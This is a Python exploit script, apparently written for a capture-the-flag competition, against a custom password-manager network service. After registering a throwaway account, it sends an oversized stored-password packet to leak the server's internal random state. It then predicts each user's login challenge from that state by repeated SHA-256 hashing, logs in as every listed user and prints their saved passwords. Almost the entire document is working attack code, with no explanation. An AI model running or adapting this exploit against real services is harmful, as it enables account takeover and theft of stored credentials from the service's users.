#!/usr/bin/env python3

import sys
import hashlib
import random
import re
import time
import json
import base64
import traceback
import socket

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

PASSMAN_PORT = 3255
TIMEOUT = 5

CMD_GET_NAME = 0
CMD_REGISTER = 1
CMD_START_LOGIN = 2
CMD_ANS_LOGIN_CHALL = 4
CMD_PUT_PASS = 5
CMD_GET_PASS_NAME = 6
CMD_GET_PASS = 8

ANS_OK = 0
ANS_USER_OK = 1
ANS_CHALLENGE = 3
ANS_PASS_NAME_INFO = 7
ANS_PASS_INFO = 9
ANS_ERR = 255

ABC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

def gen_random_string(len_from=8, len_to=12, abc=ABC):
    return "".join(random.choice(abc)
                   for i in range(random.randrange(len_from, len_to)))


def send_raw_pkt(s, data):
    s.sendall(bytes([len(data)]) + data)

def get_raw_pkt(s):
    pkt_len = s.recv(1)[0]

    data = b""
    while len(data) < pkt_len:
        cur_data = s.recv(pkt_len-len(data))
        if not cur_data:
            return b""
        data += cur_data
    return data


def gen_cmd_pkt(cmd, *args):
    pkt = bytes([cmd])

    for arg in args:
        if hasattr(arg, "encode"):
            arg = arg.encode()
        pkt += bytes([len(arg)]) + arg
    return pkt

def get_and_parse_cmd_pkt(s, expected_type=ANS_OK):
    pkt = get_raw_pkt(s)

    pkt_type = pkt[0]

    if expected_type is not None and pkt_type != expected_type:
        raise Exception("Unexpected ans type %s" % pkt_type)

    pkt_fields = []

    pkt_rest = pkt[1:]

    while pkt_rest:
        pkt_fields_len = pkt_rest[0]
        if not pkt_fields_len:
            return tuple(pkt_fields) + (b"",)
        pkt_fields.append(pkt_rest[1:1+pkt_fields_len])
        pkt_rest = pkt_rest[1+pkt_fields_len:]
    return tuple(pkt_fields)


def register_user(s, login, password):
    send_raw_pkt(s, gen_cmd_pkt(CMD_REGISTER, login, password))
    get_and_parse_cmd_pkt(s)


def login_user(s, login, password):
    send_raw_pkt(s, gen_cmd_pkt(CMD_START_LOGIN, login, password))
    challenge = get_and_parse_cmd_pkt(s, expected_type=ANS_CHALLENGE)[0]

    AES_BLOCK_LENGTH = 16
    aes_key = (password.encode() + b"\x00"*AES_BLOCK_LENGTH)[:AES_BLOCK_LENGTH]

    cipher = Cipher(algorithms.AES(aes_key), modes.ECB(), default_backend())
    decryptor = cipher.decryptor()

    challenge_ans = decryptor.update(challenge)[:4]

    send_raw_pkt(s, gen_cmd_pkt(CMD_ANS_LOGIN_CHALL, challenge_ans))
    print(get_and_parse_cmd_pkt(s))



def get_pass(s, index):
    send_raw_pkt(s, gen_cmd_pkt(CMD_GET_PASS, bytes([index])))
    password = get_and_parse_cmd_pkt(s, expected_type=ANS_PASS_INFO)
    return password


def get_users_list(s):
    PER_PAGE = 100
    MAX_PAGES = 2

    users = []

    for page in range(MAX_PAGES):
        for u in range(PER_PAGE):
            user_as_bytes = int.to_bytes(page*PER_PAGE+u, 4, "big")
            send_raw_pkt(s, gen_cmd_pkt(CMD_GET_NAME, user_as_bytes))
        for u in range(PER_PAGE):
            user_info = get_and_parse_cmd_pkt(s, expected_type=None)
            if len(user_info) == 1:
                users.append(user_info[0])
    return users


s = socket.create_connection((sys.argv[1], PASSMAN_PORT), timeout=TIMEOUT)

login = gen_random_string(8, 12)
password = gen_random_string(8, 12)

register_user(s, login, password)
login_user(s, login, password)

send_raw_pkt(s, bytes([CMD_PUT_PASS, 1, 1, 250]) + b"A"*250 + b"\x21")
get_raw_pkt(s)

send_raw_pkt(s, bytes([CMD_GET_PASS, 1]))
random_state = get_raw_pkt(s)[-32:]

for login in get_users_list(s):
    random_state = hashlib.sha256(random_state).digest()

    send_raw_pkt(s, gen_cmd_pkt(CMD_START_LOGIN, login))
    get_raw_pkt(s)

    challenge_ans = random_state[:4]

    send_raw_pkt(s, gen_cmd_pkt(CMD_ANS_LOGIN_CHALL, challenge_ans))
    get_and_parse_cmd_pkt(s)

    print(get_pass(s, 1))
